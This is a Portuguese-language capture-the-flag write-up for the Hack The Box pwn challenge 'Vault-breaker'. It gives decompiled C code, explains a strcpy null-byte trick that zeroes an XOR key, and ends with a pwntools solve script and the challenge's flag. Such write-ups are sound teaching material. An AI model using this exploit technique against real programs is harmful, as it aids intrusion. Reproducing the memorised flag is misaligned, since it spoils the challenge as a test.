# WriteUp: Vault-breaker

## Descrição do Desafio:
**Autor**: [w3th4nds](https://app.hackthebox.com/users/70668) \
**Plataforma**: [Hack The Box](https://app.hackthebox.com/challenges/333) \
**Categoria**: Pwn \
**Dificuldade**: Muito fácil \
**Data**: 2022 \
**Descrição**:
> Money maker, Big Boy Bonnie has a crew of his own to do his dirty jobs. In a tiny little planet a few lightyears away, a custom-made vault has been found by his crew. Something is hidden inside it, can you find out the way it works and bring it to Bonnie?

## Passo a Passo da Solução
### 1. Análise do arquivo fornecido
Como o desafio não fornece o código-fonte, o primeiro passo é executar o programa para vermos seu comportamento normal. Executando-o, percebemos que o programa criptografa alguma coisa, com uma chave de valor desconhecido, e devolve o resultado para nós.

Como isso é insuficiente para determinar o que está acontecendo de fato, devemos analisar o assembly do executável. Olhando pelo **Ghidra**, podemos identificar duas funções importantes, a `new_key_gen()` e a `secure_password()`. A primeira é chamada toda vez que a opção 1 for selecionada, e a segunda é chamada quando a opção 2 for selecionada.

{% hint style="info" %}

**Nota:** O programa só encerra a execução se qualquer número, com exceção do 1, for digitado.

{% endhint %}

{% code title="new_key_gen" overflow="wrap" lineNumbers="true" %}

```c
void new_key_gen(void)

{
  int iVar1;
  FILE *__stream;
  long in_FS_OFFSET;
  ulong local_60;
  ulong local_58;
  char local_48 [40];
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_60 = 0;
  local_58 = 0x22;
  __stream = fopen("/dev/urandom","rb");
  if (__stream == (FILE *)0x0) {
    fprintf(stdout,"\n%sError opening /dev/urandom, exiting..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
    exit(0x15);
  }
  while (0x1f < local_58) {
    printf("\n[*] Length of new password (0-%d): ",0x1f);
    local_58 = read_num();
  }
  memset(local_48,0,0x20);
  iVar1 = fileno(__stream);
  read(iVar1,local_48,local_58);
  for (; local_60 < local_58; local_60 = local_60 + 1) {
    while (local_48[local_60] == '\0') {
      iVar1 = fileno(__stream);
      read(iVar1,local_48 + local_60,1);
    }
  }
  strcpy(random_key,local_48);
  fclose(__stream);
  printf("\n%s[+] New key has been genereated successfully!\n%s",&DAT_00103142,&DAT_001012f8);
  if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

{% endcode %}

{% code title="secure_password" overflow="wrap" lineNumbers="true" %}

```c
void secure_password(void)

{
  char *__buf;
  int __fd;
  ulong uVar1;
  size_t sVar2;
  long in_FS_OFFSET;
  char acStack_88 [24];
  undefined8 uStack_70;
  int local_68;
  int local_64;
  char *local_60;
  undefined8 local_58;
  char *local_50;
  FILE *local_48;
  undefined8 local_40;
  
  local_40 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  uStack_70 = 0x100c26;
  puts("\x1b[1;34m");
  uStack_70 = 0x100c4c;
  printf(&DAT_00101308,&DAT_001012f8,&DAT_00101300,&DAT_001012f8);
  local_60 = &DAT_00101330;
  local_64 = 0x17;
  local_58 = 0x16;
  local_50 = acStack_88;
  memset(acStack_88,0,0x17);
  local_48 = fopen("flag.txt","rb");
  __buf = local_50;
  if (local_48 == (FILE *)0x0) {
    fprintf(stderr,"\n%s[-] Error opening flag.txt, contact an Administrator..\n",&DAT_00101300);
                    /* WARNING: Subroutine does not return */
    exit(0x15);
  }
  sVar2 = (size_t)local_64;
  __fd = fileno(local_48);
  read(__fd,__buf,sVar2);
  fclose(local_48);
  puts(local_60);
  fwrite("\nMaster password for Vault: ",1,0x1c,stdout);
  local_68 = 0;
  while( true ) {
    uVar1 = (ulong)local_68;
    sVar2 = strlen(local_50);
    if (sVar2 <= uVar1) break;
    putchar((int)(char)(random_key[local_68] ^ local_50[local_68]));
    local_68 = local_68 + 1;
  }
  puts("\n");
                    /* WARNING: Subroutine does not return */
  exit(0x1b39);
}
```

{% endcode %}

Analisando as funções, podemos perceber o seguinte:
- Podemos chamar a função `new_key_gen()` quantas vezes nós quisermos.
- A *key* é gerada através do arquivo `/dev/urandom`, e seu tamanho é determinado pelo usuário.
- A *key* é salva na variável `random_key`, que consegue armazenar no máximo 32 caracteres.
- A **flag** é criptografada por um xor entre os caracteres dela com os caracteres da *key* de mesmo índice.

### 2. Exploit
A solução é bem simples, a *key* gerada é salva na variável `random_key`, que desde o início já possuí um valor aleatório, por meio da função `strcpy()`. Essa função, além de copiar o valor da *key* ela também copia os *byte* nulo presente no final de toda *string*.

Com isso, podemos ir zerando o valor da `random_key`, começando com uma *key* de tamanho máximo e indo até o valor 0. Dessa forma, o *byte* nulo presente no final de cada *key* gerada é salvo nos índices [31] a [0] da variável.

{% hint style="warning" %}

**Importante:** A variável deve ser zerada do final até o início, pois se for do início até o final, o *byte* zerado anteriormente é sobrescrevido por um novo valor de *key*.

{% endhint %}

Após zerar a variável, basta selecionar a opção 2, que a **flag** será mostrada, pois qualquer operação xor entre um valor e 0 é o próprio valor.

{% code title="solve.py" overflow="wrap" lineNumbers="true" %}

```py
from pwn import *

elf = context.binary = ELF("./vault-breaker")
p = remote("ip", porta)
#p = process()

for i in range(31, -1, -1):
    p.recvuntil(b"[+]")
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"(0-31): ", hex(i).encode())

p.sendlineafter(b"> ", b"2")
p.recvuntil(b"Vault: ")
print(p.recvline().decode())
```

{% endcode %}

### Flag
`HTB{d4nz4_kudur0r0r0}`

## Autor da WriteUp
[Membro de Exploitation - HenriUz](https://github.com/HenriUz)